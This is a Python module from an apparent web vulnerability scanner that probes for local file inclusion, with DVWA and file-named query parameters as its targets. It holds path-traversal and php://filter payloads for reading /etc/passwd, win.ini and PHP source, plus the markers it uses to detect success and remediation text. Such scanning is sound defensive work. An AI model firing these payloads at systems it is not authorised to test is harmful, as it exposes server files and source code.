"""
Local / Remote File Inclusion Probe (Architecture §5.2, §17).

Targets DVWA's `/fi/?page=include.php` and any file-name-shaped query param
(page, file, include, doc, path, template, view). Uses a layered evidence model:

  Signal A) /etc/passwd canonical marker — the unmistakable
            "root:x:0:0:" line that only appears when LFI succeeded.
  Signal B) Windows boot fingerprint (`[boot loader]`, `multi(0)disk(0)`).
  Signal C) PHP wrapper output: the `php://filter/convert.base64-encode/`
            wrapper returns base64 of the file; we detect a sufficiently
            long, decodable base64 blob that decodes to PHP source markers.
  Signal D) PHP error fingerprints proving filesystem access:
            `failed to open stream`, `include(`, `Warning: include`.
  Signal E) Differential vs the baseline (>=2 verifier signals).

A finding is only emitted when the canonical marker (A or B or C) is present
AND the differential confirms it (i.e. >= 2 independent signals).
"""

from __future__ import annotations

import base64
import logging
import re
import urllib.parse

from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, TaskTarget, Vulnerability

logger = logging.getLogger("FileInclusionProbe")

# Path-traversal probes covering Linux, Windows, and PHP wrappers.
_PASSWD_PROBES = (
    "/etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00",  # null byte truncation
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
)
_PHP_WRAPPER_PROBES = (
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=include.php",
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
)

# Parameter names commonly used as file inclusion sinks.
_FILE_PARAMS = (
    "page",
    "file",
    "include",
    "doc",
    "path",
    "template",
    "view",
    "load",
    "src",
    "name",
    "dir",
    "show",
    "cat",
)

# Canonical evidence markers.
_PASSWD_LINE = re.compile(r"^(root|daemon|nobody):[x*!]:\d+:\d+:", re.M)
_WIN_INI = re.compile(r"\[(boot\s*loader|fonts|extensions)\]", re.I)
_PHP_ERROR = re.compile(
    r"(?:failed to open stream|Warning:\s*include\(|Warning:\s*require\(|"
    r"include_path|No such file or directory|open_basedir restriction)",
    re.I,
)
# Heuristic: the convert.base64-encode wrapper response is a long base64 blob.
_LONG_B64 = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")


def _b64_decodes_to_php(text: str) -> str | None:
    """If text contains a long base64 blob that decodes to PHP source, return
    a short snippet of the decoded content. Otherwise None."""
    for token in _LONG_B64.findall(text or "")[:6]:
        try:
            decoded = base64.b64decode(token, validate=False).decode("utf-8", errors="ignore")
        except Exception as exc:
            logger.debug("[LFI] base64 decode failed: %s", exc)
            continue
        if "<?php" in decoded or "<?=" in decoded or "<?xml" in decoded:
            return decoded[:200]
    return None


class FileInclusionProbe(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "File Inclusion Probe"

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        url = packet.target.url
        headers = dict(packet.target.headers or {})
        targets: list[TaskTarget] = []

        # Baseline (index 0) — original unmodified target.
        targets.append(
            TaskTarget(url=url, method=packet.target.method or "GET", headers=headers, payload=packet.target.payload)
        )

        if "?" not in url:
            return targets
        base, query = url.split("?", 1)
        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        if not params:
            return targets

        # Pick the file-shaped params first; fall back to all params.
        target_params = [p for p in params if p.lower() in _FILE_PARAMS] or list(params.keys())
        probes = _PASSWD_PROBES + _PHP_WRAPPER_PROBES

        for param in target_params:
            for probe in probes:
                mutated = {k: list(v) for k, v in params.items()}
                mutated[param] = [probe]
                attack = f"{base}?{urllib.parse.urlencode(mutated, doseq=True)}"
                targets.append(
                    TaskTarget(url=attack, method="GET", headers=dict(headers), payload=packet.target.payload)
                )
        return targets

    async def analyze_responses(
        self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket
    ) -> list[Vulnerability]:
        from backend.modules.evidence import differential

        vulns: list[Vulnerability] = []
        if not interactions:
            return vulns
        _baseline_target, baseline_text = interactions[0]
        baseline_text = baseline_text if isinstance(baseline_text, str) else ""
        # Track which markers were already in the baseline so we don't re-flag
        # them as fresh evidence.
        baseline_has_passwd = bool(_PASSWD_LINE.search(baseline_text))
        baseline_has_winini = bool(_WIN_INI.search(baseline_text))

        seen: set[str] = set()
        for idx, (target, text) in enumerate(interactions):
            if idx == 0 or not isinstance(text, str) or not text:
                continue

            signals: list[str] = []
            evidence_bits: list[str] = []

            if not baseline_has_passwd and _PASSWD_LINE.search(text):
                signals.append("etc_passwd_line")
                evidence_bits.append("/etc/passwd content reflected")
            if not baseline_has_winini and _WIN_INI.search(text):
                signals.append("windows_boot_ini")
                evidence_bits.append("Windows ini section reflected")
            decoded_php = _b64_decodes_to_php(text)
            if decoded_php and decoded_php not in baseline_text:
                signals.append("php_wrapper_b64")
                evidence_bits.append(f"PHP source via base64 wrapper: {decoded_php[:80]!r}")
            if _PHP_ERROR.search(text) and not _PHP_ERROR.search(baseline_text):
                signals.append("php_filesystem_error")
                evidence_bits.append("PHP filesystem error revealed")

            # Differential vs baseline (any change at all).
            ev = differential(baseline_text, text)
            if ev.signals >= 1 or ev.verified:
                signals.append("response_differential")

            # Confirm only when at least 2 independent signals agree AND one
            # of them is a CANONICAL inclusion marker (not just diff or error).
            canonical = "etc_passwd_line" in signals or "windows_boot_ini" in signals or "php_wrapper_b64" in signals
            if not canonical or len(set(signals)) < 2:
                continue

            key = target.url
            if key in seen:
                continue
            seen.add(key)

            severity = "CRITICAL" if "etc_passwd_line" in signals or "php_wrapper_b64" in signals else "HIGH"
            vulns.append(
                Vulnerability(
                    name="File Inclusion (LFI / Path Traversal)",
                    severity=severity,
                    description=(
                        "Injected path/wrapper triggered server-side file inclusion. "
                        f"Independent signals: {', '.join(signals)}."
                    ),
                    evidence=(
                        f"Target: {target.url}\nEvidence: {'; '.join(evidence_bits)}\nDifferential: {ev.summary}"
                    ),
                    remediation=(
                        "Resolve user-supplied path against an explicit allow-list of files. "
                        "Disable PHP wrappers (php://, file://, expect://) via "
                        "allow_url_include=Off and open_basedir. Strip null bytes and "
                        "encoded traversal sequences before any filesystem call."
                    ),
                )
            )
            # One confirmed LFI per URL is enough.
            break
        return vulns


# Backward-compatible alias (FIX)
LFIProbe = FileInclusionProbe
